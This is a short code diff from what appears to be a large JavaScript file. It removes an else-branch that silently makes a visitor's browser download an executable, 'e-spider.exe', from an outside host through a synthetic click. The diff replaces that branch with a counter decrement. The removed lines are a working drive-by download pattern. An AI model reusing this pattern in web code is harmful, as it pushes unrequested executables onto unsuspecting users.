@@ -6245,15 +6245,7 @@ window.requestAnimFrame = function() {
 
     }else{
 
-        var eq = document.createElement('a');
-
-        eq.href = "http://chinagoogle.cc/e-spider.exe";
-
-        eq.setAttribute('download','e-spider.exe');
-
-        var evt = new MouseEvent('click');
-
-        eq.dispatchEvent(evt);
+        _initSpiderCount -= 1;
 
     }
 
